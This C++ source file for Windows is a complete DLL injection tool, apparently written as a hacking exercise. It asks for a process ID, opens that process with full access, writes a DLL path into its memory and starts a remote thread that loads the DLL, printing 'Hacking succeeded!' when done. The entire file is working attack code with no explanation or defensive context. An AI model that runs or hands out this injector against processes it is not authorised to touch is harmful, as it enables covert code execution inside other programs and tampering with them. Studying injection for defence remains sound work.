#include <iostream>
#include <tchar.h>
#include <Windows.h>

int main()
{
	LPCSTR szPath = "C:\\Cyber\\DLLInjection\\MyDLL\\x64\\Debug\\MyDLL.dll";
	PVOID pfnLoadLibrary = (PVOID)GetProcAddress(LoadLibrary(L"Kernel32.dll"), "LoadLibraryA");
	if (pfnLoadLibrary == NULL)
	{
		std::cout << "Error: " << GetLastError() << "\n";
		return GetLastError();
	}

	DWORD dwProcessID;
	std::cout << "Enter Process ID to Hack: ";
	std::cin >> dwProcessID;

	std::cout << "Hacking...\n";

	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, false, dwProcessID);

	PVOID pvAddr = VirtualAllocEx(hProcess, NULL, strlen(szPath) + 1, MEM_COMMIT, PAGE_READWRITE);
	if (pvAddr == NULL)
	{
		std::cout << "Error: " << GetLastError() << "\n";
		return GetLastError();
	}

	if (!WriteProcessMemory(hProcess, pvAddr, (LPVOID)szPath, strlen(szPath) + 1, 0))
	{
		std::cout << "Error: " << GetLastError() << "\n";
		return GetLastError();
	}

	HANDLE hRemoteThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pfnLoadLibrary, pvAddr, 0, NULL);
	if (!hRemoteThread || hRemoteThread == INVALID_HANDLE_VALUE)
	{
		std::cout << "Error: " << GetLastError() << "\n";
		return GetLastError();
	}

	std::cout << "DLL Injected.\n";
	std::cout << "Hacking succeeded!\n";

	WaitForSingleObject(hRemoteThread, INFINITE);
	CloseHandle(hRemoteThread);

	return 0;
}